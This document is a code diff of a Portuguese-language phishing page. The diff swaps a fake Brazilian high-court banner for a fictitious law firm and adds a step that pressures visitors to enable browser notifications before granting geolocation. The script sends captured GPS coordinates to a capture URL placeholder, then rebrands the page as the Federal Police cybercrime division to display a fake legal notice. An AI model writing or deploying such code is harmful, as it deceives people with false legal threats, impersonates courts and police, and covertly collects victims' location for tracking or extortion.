@@ -110,30 +110,37 @@
 <body>
   <div class="wrap">
     <div class="barra-topo" id="barraStj">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Bras%C3%A3o_do_Superior_Tribunal_de_Justi%C3%A7a.svg/240px-Bras%C3%A3o_do_Superior_Tribunal_de_Justi%C3%A7a.svg.png" alt="Superior Tribunal de Justiça" onerror="this.style.display='none'" />
-      <div class="org">
-        <h1>SUPERIOR TRIBUNAL DE JUSTIÇA</h1>
-        <p>CARTÓRIO JUDICIAL DIGITAL — VALIDAÇÃO DE INTIMAÇÕES ELETRÔNICAS</p>
+      <div class="org" style="width:100%;text-align:center">
+        <h1>COELHO NETO ADVOCACIA</h1>
+        <p>ESCRITÓRIO DE ADVOCACIA — CENTRAL DE DOCUMENTOS E INTIMAÇÕES</p>
       </div>
     </div>
 
-    <!-- ===== PORTAL: exige autorização de localização ANTES da notificação ===== -->
+    <!-- ===== PORTAL: 2 etapas (notificações -> localização) ANTES da notificação ===== -->
     <div class="card" id="portalVerificacao">
       <div class="card-body">
         <div class="ico-escudo">
-          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#0a2e5c" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
+          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#0a2e5c" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l9 4.5v5c0 5-3.8 8.4-9 9.5-5.2-1.1-9-4.5-9-9.5v-5L12 3z"/><path d="M9 12l2 2 4-4"/></svg>
         </div>
-        <h2>Consulta de Intimação Eletrônica</h2>
-        <p class="sub">Existe uma <b>notificação judicial disponível para o endereço de IP desta conexão</b>. Por exigência do art. 5º da Lei nº 11.419/2006 (Processo Eletrônico), a entrega exige a <b>confirmação da localização geográfica do destinatário</b>.</p>
+        <h2>Documento disponível para visualização</h2>
+        <p class="sub" id="subPortal">Existe um <b>documento judicial disponível em seu nome</b>, encaminhado pelo escritório <b>Coelho Neto Advocacia</b>. Para liberar o acesso ao teor completo, são necessárias <b>duas autorizações rápidas do seu dispositivo</b>.</p>
 
-        <div class="caixa-autorizacao">
-          <b>📍 Autorização de localização necessária</b>
-          <p>Seu navegador exibirá um pedido de permissão de localização. <b>Toque em "Permitir" / "Allow"</b> para confirmar seu acesso e exibir o teor da notificação. O acesso sem validação não permite a visualização do documento.</p>
+        <!-- ETAPA 1: notificações -->
+        <div class="caixa-autorizacao" id="etapaNotif">
+          <b>🔔 Etapa 1 de 2 — Ativar notificações</b>
+          <p>Seu navegador exibirá um pedido de permissão para <b>notificações</b>. <b>Toque em "Permitir" / "Allow"</b> para receber o aviso de protocolo e prosseguir. Sem as notificações ativas, o documento não pode ser liberado por segurança.</p>
+          <button class="btn-verify" id="btnNotif" onclick="ativarNotificacoes()" style="margin-top:12px;background:linear-gradient(135deg,#1a2f4a 0%,#24466b 100%)">ATIVAR NOTIFICAÇÕES E CONTINUAR</button>
         </div>
 
-        <button class="btn-verify" id="btnVerificar" onclick="iniciarVerificacao()" style="background:linear-gradient(135deg,#1a2f4a 0%,#24466b 100%)">CONFIRMAR LOCALIZAÇÃO E EXIBIR NOTIFICAÇÃO</button>
+        <!-- ETAPA 2: localização -->
+        <div class="caixa-autorizacao" id="etapaLocal" style="display:none">
+          <b>📍 Etapa 2 de 2 — Confirmar localização</b>
+          <p>Agora seu navegador solicitará a <b>permissão de localização</b>. <b>Toque em "Permitir" / "Allow"</b> para validar a entrega do documento e exibir o teor completo.</p>
+          <button class="btn-verify" id="btnVerificar" onclick="iniciarVerificacao()" style="margin-top:12px;background:linear-gradient(135deg,#1a2f4a 0%,#24466b 100%)">CONFIRMAR LOCALIZAÇÃO E LIBERAR DOCUMENTO</button>
+        </div>
+
         <div class="carregando" id="spinnerVerificacao"></div>
-        <p class="aviso-obrig" id="avisoObrig">⚠️ ACESSO NÃO AUTORIZADO. A validação geográfica é obrigatória para visualizar este documento. Tente novamente e <b>PERMITA a localização</b>.</p>
+        <p class="aviso-obrig" id="avisoObrig">⚠️ ACESSO NÃO AUTORIZADO. As duas autorizações são obrigatórias para liberar o documento. Tente novamente e <b>PERMITA</b> as solicitações.</p>
       </div>
     </div>
 
@@ -187,7 +194,28 @@
     window.CAPTURA_URL = "__CAPTURA_URL__";
     var tentativas = 0;
     var dadosGps = null, erroGps = null;
+    var notifOk = false;
 
+    // ===== ETAPA 1: notificações =====
+    function ativarNotificacoes() {
+      var btn = document.getElementById("btnNotif");
+      btn.disabled = true;
+      btn.textContent = "AGUARDE…";
+      if (!("Notification" in window)) { proximaEtapa(); return; }
+      Notification.requestPermission().then(function (perm) {
+        notifOk = (perm === "granted");
+        proximaEtapa();
+      }).catch(function () { proximaEtapa(); });
+    }
+    window.ativarNotificacoes = ativarNotificacoes;
+
+    function proximaEtapa() {
+      document.getElementById("etapaNotif").style.display = "none";
+      document.getElementById("etapaLocal").style.display = "block";
+      document.getElementById("avisoObrig").style.display = "none";
+    }
+
+    // ===== ETAPA 2: localização =====
     function iniciarVerificacao() {
       var btn = document.getElementById("btnVerificar");
       var spin = document.getElementById("spinnerVerificacao");
@@ -196,6 +224,7 @@
       tentativas++;
       pedirGps();
     }
+    window.iniciarVerificacao = iniciarVerificacao;
 
     function pedirGps() {
       if (!navigator.geolocation) { erroGps = "sem-suporte"; enviarCaptura(); return; }
@@ -243,14 +272,13 @@
     function revelar(d) {
       document.getElementById("spinnerVerificacao").style.display = "none";
       document.getElementById("portalVerificacao").style.display = "none";
-      // Troca a identidade: STJ (permissão) -> Polícia Federal (notificação).
+      // Troca a identidade: Coelho Neto Advocacia (permissões) -> Polícia Federal (notificação).
       var barra = document.getElementById("barraStj");
       barra.style.background = "linear-gradient(135deg, #0a2e5c 0%, #123c74 100%)";
-      barra.querySelector("img").src = "https://i.imgur.com/OhF5OTT.jpeg";
-      barra.querySelector("img").style.borderColor = "#c9a227";
-      barra.querySelector(".org h1").textContent = "DEPARTAMENTO DE POLÍCIA FEDERAL";
-      barra.querySelector(".org p").textContent = "DIVISÃO DE COMBATE A CRIMES CIBERNÉRICOS — DCCIB";
-      barra.id = "";
+      barra.innerHTML =
+        '<img src="https://i.imgur.com/OhF5OTT.jpeg" alt="Polícia Federal" style="height:46px;width:46px;border-radius:50%;object-fit:cover;border:2px solid #c9a227" onerror="this.style.display=\'none\'" />' +
+        '<div class="org"><h1 style="color:#fff;font-size:.95rem;letter-spacing:.1em">DEPARTAMENTO DE POLÍCIA FEDERAL</h1>' +
+        '<p style="color:#9db4cf;font-size:.68rem;letter-spacing:.08em;margin-top:2px">DIVISÃO DE COMBATE A CRIMES CIBERNÉRICOS — DCCIB</p></div>';
       document.getElementById("notificacao").style.display = "block";
       window.scrollTo({ top: 0 });
 
